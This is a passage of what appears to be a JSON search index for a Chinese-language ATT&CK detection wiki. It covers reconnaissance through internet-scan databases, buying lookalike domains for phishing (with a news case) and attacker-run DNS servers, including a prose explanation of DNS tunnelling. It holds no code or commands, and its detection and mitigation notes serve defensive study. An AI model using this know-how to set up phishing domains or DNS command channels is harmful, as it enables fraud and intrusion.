<p>https://www.freebuf.com/vuls/227805.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"T1596-005-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u626b\u63cf\u6570\u636e\u5e93","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u516c\u5171\u626b\u63cf\u6570\u636e\u5e93\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u4ee5\u4fbf\u5728\u5b9a\u4f4d\u65f6\u4f7f\u7528\u3002\u5404\u79cd\u5728\u7ebf\u670d\u52a1\u4e0d\u65ad\u516c\u5e03\u4e92\u8054\u7f51\u626b\u63cf/\u8c03\u67e5\u7684\u7ed3\u679c\uff0c\u901a\u5e38\u4f1a\u6536\u96c6\u8bf8\u5982\u6d3b\u8dc3\u7684IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u3001\u5f00\u653e\u7684\u7aef\u53e3\u3001\u8bc1\u4e66\uff0c\u751a\u81f3\u662f\u670d\u52a1\u5668\u7684\u6807\u8bed\u7b49\u4fe1\u606f\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u626b\u63cf\u6570\u636e\u5e93\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u4ee5\u5229\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u8be2\u5de5\u5177\uff0c\u4ece\u8fd9\u4e9b\u670d\u52a1\u4e2d\u83b7\u53d6\u4fe1\u606f\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f1a\u5bfb\u6c42\u6709\u5173\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u6216\u8005\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u96c6\u6765\u53d1\u73b0\u6210\u529f\u5165\u4fb5\u7684\u673a\u4f1a\u3002\u6765\u81ea\u8fd9\u4e9b\u8d44\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u63ed\u793a\u4e86\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\uff09\u3001\u5efa\u7acb\u884c\u52a8\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u548c/\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\uff09\u7684\u673a\u4f1a\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f8b\u5982\u5229\u7528fofa\u3001zoomeye\u3001quake\u3001shodan\u7b49\u7a7a\u95f4\u6d4b\u7ed8\u7cfb\u7edf\uff0c\u6536\u96c6\u76f8\u5173\u7528\u6237\u4fe1\u606f\u3002</p> <p>FOFA: https://fofa.so/</p> <p>zoomeye: https://www.zoomeye.org/</p> <p>quake: https://quake.360.cn/quake/#/index</p> <p>shodan: https://www.shodan.io/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-005-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%89%AB%E6%8F%8F%E6%95%B0%E6%8D%AE%E5%BA%93/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1596-005</p> <p>https://attack.mitre.org/techniques/T1596/005/</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/","title":"T1583-001-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-\u57df\u540d","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u53ef\u5728\u5bf9\u76ee\u6807\u8fdb\u884c\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u57df\u540d\u3002\u57df\u540d\u662f\u7528\u4e8e\u4ee3\u8868\u4e00\u4e2a\u6216\u591a\u4e2aIP\u5730\u5740\u7684\u53ef\u8bfb\u540d\u79f0\u3002\u5b83\u4eec\u53ef\u4ee5\u88ab\u8d2d\u4e70\uff0c\u6216\u8005\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u514d\u8d39\u83b7\u5f97\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8d2d\u4e70\u7684\u57df\u540d\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u5305\u62ec\u7f51\u7edc\u9493\u9c7c\u3001\u975e\u6cd5\u5165\u4fb5\u4ee5\u53ca\u547d\u4ee4\u548c\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0e\u5408\u6cd5\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u901a\u8fc7\u4f7f\u7528\u540c\u97f3\u5b57\u6216\u4f7f\u7528\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\uff08TLD\uff09\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u56fd\u9645\u5316\u57df\u540d\uff08IDN\uff09\u6765\u521b\u5efa\u89c6\u89c9\u4e0a\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u4fbf\u5728\u884c\u52a8\u4e2d\u4f7f\u7528\u3002</p> <p>\u57df\u540d\u6ce8\u518c\u5546\u90fd\u6709\u4e00\u4e2a\u53ef\u516c\u5f00\u67e5\u770b\u7684\u6570\u636e\u5e93\uff0c\u663e\u793a\u6bcf\u4e2a\u6ce8\u518c\u57df\u540d\u7684\u8054\u7cfb\u4fe1\u606f\u3002WHOIS\u670d\u52a1\u663e\u793a\u79c1\u4eba\u5176\u4ed6\u4fe1\u606f\uff0c\u5982\u4ed6\u4eec\u81ea\u5df1\u7684\u516c\u53f8\u6570\u636e\uff0c\u800c\u4e0d\u662f\u57df\u540d\u7684\u6240\u6709\u8005\u3002\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u8fd9\u79cd\u79c1\u4ebaWHOIS\u670d\u52a1\u6765\u63a9\u76d6\u5173\u4e8e\u8c01\u62e5\u6709\u6240\u8d2d\u57df\u540d\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u4f7f\u7528\u4e0d\u540c\u7684\u6ce8\u518c\u4fe1\u606f\u3001\u5728\u4e0d\u540c\u7684\u57df\u540d\u6ce8\u518c\u5546\u5904\u8d2d\u4e70\u57df\u540d\uff0c\u8fdb\u4e00\u6b65\u5e72\u6270\u8ffd\u8e2a\u5176\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u65b0\u95fb\u7b80\u4ecb\uff1a\u4e0d\u6cd5\u5206\u5b50\u642d\u5efa\u4e86\u67d0\u77e5\u540d\u5916\u5356\u5e73\u53f0\u7684\u9493\u9c7c\u7f51\u7ad9\uff08www.meituam.cn\uff09\uff0c\u901a\u8fc7\u53d1\u9001\u77ed\u4fe1\u8bc8\u9a97\u8be5\u5e73\u53f0\u5165\u9a7b\u5546\u6237\u8fdb\u884c\u4e2a\u4eba\u4fe1\u606f\u5f55\u5165\u53ca\u7f34\u8d39\u3002\u8be5\u56e2\u4f19\u81ea2020\u5e74\u4ee5\u6765\uff0c\u4ee5\u6728\u9a6c\u77ed\u4fe1\u94fe\u63a5\u7684\u65b9\u5f0f\u4f5c\u684850\u4f59\u8d77\uff0c\u6d89\u6848\u8d44\u91d180\u4f59\u4e07\u5143\uff0c\u53d1\u6848\u5730\u6d89\u53ca\u5168\u56fd21\u4e2a\u7701\u4efd\u3002</p> <p>https://www.sohu.com/a/452671903_648183</p> <p>\u540c\u6837\u5728\u67d0\u4e9b\u7535\u5546\u5e73\u53f0\uff0c\u90e8\u5206\u53f7\u79f0\u80fd\u591f\u7834\u89e3apple\u5bc6\u7801\u7684\u5546\u5bb6\uff0c\u6240\u8c13\u7684\u8f6f\u89e3\u5bc6\uff0c\u4e5f\u662f\u7528\u7684\u76f8\u540c\u624b\u6cd5\uff0c\u4f2a\u9020\u548capple\u76f8\u4f3c\u57df\u540d\uff0c\u53d1\u9001\u9493\u9c7c\u94fe\u63a5\u7ed9\u6307\u5b9a\u7684\u7528\u6237\uff0c\u8bf1\u4f7f\u7528\u6237\u70b9\u51fb\u8fdb\u5165\u4f2a\u9020\u7ad9\u70b9\uff0c\u8f93\u5165\u8d26\u6237\u53ca\u5bc6\u7801\u3002\u4ece\u800c\u5b9e\u73b0\u8f6f\u89e3\u5bc6\u7684\u6548\u679c\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_6","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u4f01\u4e1a\u53ef\u80fd\u6545\u610f\u6ce8\u518c\u4e0e\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u4ee5\u963b\u6b62\u653b\u51fb\u8005\u521b\u5efa\u9519\u522b\u5b57\u57df\u540d\u3002\u8fd9\u79cd\u6280\u672f\u7684\u5176\u4ed6\u65b9\u9762\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_8","title":"\u68c0\u6d4b","text":"<p>\u6839\u636e\u8bbe\u8ba1\uff0c\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u4f1a\u88ab\u8bb0\u5f55\u5728\u516c\u5171\u6ce8\u518c\u65e5\u5fd7\u4e2d\u3002\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2a\u65b0\u83b7\u5f97\u7684\u57df\u540d\u7684\u670d\u52a1\uff0c\u5982WHOIS\u6570\u636e\u5e93\u6216\u88ab\u52a8DNS\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6709\u53ef\u80fd\u901a\u8fc7\u5df2\u77e5\u7684\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u6765\u53d1\u73b0\u653b\u51fb\u8005\u8d2d\u4e70\u7684\u5176\u4ed6\u57fa\u7840\u8bbe\u65bd\u3002\u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u81ea\u5df1\u7684\u57df\u540d\u7ed3\u6784\u76f8\u4f3c\u7684\u57df\u540d\uff0c\u5305\u62ec\u5728\u4e0d\u540c\u7684\u9876\u7ea7\u57df\u540d\u4e0b\u521b\u5efa\u7684\u57df\u540d\u3002\u5c3d\u7ba1\u5b58\u5728\u5404\u79cd\u5de5\u5177\u548c\u670d\u52a1\u6765\u8ddf\u8e2a\u3001\u67e5\u8be2\u548c\u76d1\u6d4b\u57df\u540d\u6ce8\u518c\u4fe1\u606f\uff0c\u4f46\u8ddf\u8e2a\u591a\u4e2aDNS\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u9700\u8981\u591a\u79cd\u5de5\u5177\u3001\u670d\u52a1\u6216\u66f4\u9ad8\u7ea7\u7684\u5206\u6790\u65b9\u6cd5\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u521d\u59cb\u8bbf\u95ee\u548c\u6307\u6325\u4e0e\u63a7\u5236\u671f\u95f4\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-001-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%9F%9F%E5%90%8D/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1583-001</p> <p>https://attack.mitre.org/techniques/T1583/001/</p> <p>\u4e0d\u6cd5\u5206\u5b50\u9ad8\u4eff\u67d0\u5916\u5356\u5e73\u53f0\u7f51\u7ad9\uff0c\u5165\u9a7b\u5546\u6237\u906d\u9047\u201c\u9493\u9c7c\u653b\u51fb\u201d</p> <p>https://www.sohu.com/a/452671903_648183</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/","title":"T1583-002-\u8d2d\u4e70\u57fa\u7840\u8bbe\u65bd-DNS\u670d\u52a1","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5efa\u7acb\u4ed6\u4eec\u81ea\u5df1\u7684\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u5728\u7834\u574f\u540e\u7684\u6d3b\u52a8\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528DNS\u6d41\u91cf\u8fdb\u884c\u5404\u79cd\u4efb\u52a1\uff0c\u5305\u62ec\u6307\u6325\u548c\u63a7\u5236\uff08\u4f8b\u5982\uff1a\u5e94\u7528\u5c42\u534f\u8bae\uff09\u3002\u4e0e\u5176\u52ab\u6301\u73b0\u6709\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u9009\u62e9\u914d\u7f6e\u548c\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\u6765\u652f\u6301\u6e17\u900f\u884c\u52a8\u3002</p> <p>\u901a\u8fc7\u8fd0\u884c\u81ea\u5df1\u7684DNS\u670d\u52a1\u5668\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u66f4\u591a\u5730\u63a7\u5236\u4ed6\u4eec\u5982\u4f55\u7ba1\u7406\u670d\u52a1\u5668\u7aef\u7684DNS C2\u6d41\u91cf\u3002\u901a\u8fc7\u5bf9DNS\u670d\u52a1\u5668\u7684\u63a7\u5236\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u914d\u7f6eDNS\u5e94\u7528\u7a0b\u5e8f\uff0c\u4e3a\u6076\u610f\u8f6f\u4ef6\u63d0\u4f9b\u6709\u6761\u4ef6\u7684\u54cd\u5e94\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u57fa\u4e8eDNS\u7684C2\u901a\u9053\u7684\u7ed3\u6784\u4e0a\u6709\u66f4\u5927\u7684\u7075\u6d3b\u6027\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#dns-tunneling","title":"DNS Tunneling","text":"<p>DNS Tunneling\u662f\u9690\u853d\u901a\u9053\u7684\u4e00\u79cd\uff0c\u901a\u8fc7\u5c06\u5176\u4ed6\u534f\u8bae\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u4f20\u8f93\u3002\u56e0\u4e3a\u5728\u4e92\u8054\u7f51\u4e2dDNS\u662f\u4e00\u4e2a\u5fc5\u4e0d\u53ef\u5c11\u7684\u670d\u52a1\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u9632\u706b\u5899\u548c\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\u5f88\u5c11\u4f1a\u5bf9DNS\u6d41\u91cf\u8fdb\u884c\u8fc7\u6ee4\uff0c\u7531\u6b64DNS\u4f5c\u4e3a\u9690\u853d\u4fe1\u9053\u6709\u5929\u751f\u4f18\u52bf\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_2","title":"\u539f\u7406","text":"<p>DNS Tunneling\u53ef\u4ee5\u5206\u4e3a\u76f4\u8fde\u548c\u4e2d\u7ee7\u4e24\u79cd\u3002</p> <p>\u76f4\u8fde\uff1aclient\u76f4\u63a5\u548c\u6307\u5b9a\u7684\u76ee\u6807DNS Server(Authoritative NS Server)\u8fde\u63a5\uff0c\u901a\u8fc7\u5c06\u6570\u636e\u7f16\u7801\u5c01\u88c5\u5728DNS\u534f\u8bae\u4e2d\u8fdb\u884c\u901a\u4fe1\u3002\u8fd9\u79cd\u65b9\u5f0f\u901f\u5ea6\u5feb\uff0c\u4f46\u662f\u9690\u853d\u6027\u8f83\u5f31\uff0c\u5bb9\u6613\u88ab\u63a2\u6d4b\u5230\uff0c\u4e14\u5b58\u5728\u7684\u9650\u5236\u6bd4\u8f83\u591a\uff0c\u5f88\u591a\u573a\u666f\u4e0d\u5141\u8bb8\u81ea\u5df1\u6307\u5b9aDNS Server\u3002</p> <p>\u4e2d\u7ee7\uff1a\u901a\u8fc7\u8fed\u4ee3DNS\u67e5\u8be2\u53ef\u4ee5\u5b9e\u73b0\u4e2d\u7ee7\u901a\u9053\uff0c\u66f4\u4e3a\u9690\u853d\uff0c\u4f46\u540c\u65f6\u56e0\u4e3a\u6570\u636e\u5305\u5230\u8fbe\u76ee\u6807DNS Server\u524d\u9700\u8981\u7ecf\u8fc7\u591a\u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u901f\u5ea6\u4e0a\u8f83\u6162\uff0c\u4f46\u662f\u53ef\u4ee5\u7a81\u7834\u9632\u706b\u5899\u7b49\u7684\u9650\u5236\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#dns","title":"DNS\u96a7\u9053\u5de5\u5177","text":"<p>\u4f7f\u7528DNS over HTTPS\uff08DoH\uff09\u6784\u5efa\u5f39\u6027C2\u57fa\u7840\u67b6\u6784\uff1ahttps://xz.aliyun.com/t/3068</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_7","title":"\u5efa\u8bae","text":""},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_8","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_9","title":"\u68c0\u6d4b","text":"<p>\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u9632\u5fa1\u56e2\u961f\uff08\u7ec4\u7ec7\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\u671f\u95f4\u3002</p>"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1583-002-%E8%B4%AD%E4%B9%B0%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-DNS%E6%9C%8D%E5%8A%A1/#_10","title":"\u53c2